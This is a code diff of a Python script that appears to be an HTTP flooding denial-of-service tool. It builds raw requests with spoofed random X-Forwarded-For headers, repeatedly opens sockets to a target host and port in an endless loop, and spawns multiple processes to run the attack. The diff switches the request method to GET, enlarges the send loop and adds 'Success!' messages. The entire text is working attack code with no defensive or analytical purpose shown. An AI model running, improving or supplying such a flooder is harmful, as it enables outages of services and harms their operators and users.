@@ -28,14 +28,14 @@ def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "DELETE " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+  get_host = "GET " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
       #Attack starts here
-      for y in range(80):
+      for y in range(80,8080):
           atk.send(str.encode(request))
     except socket.error:
       sleep(0)
@@ -55,5 +55,8 @@ def send3attack():
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
-
+    
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+    
 send3attack()
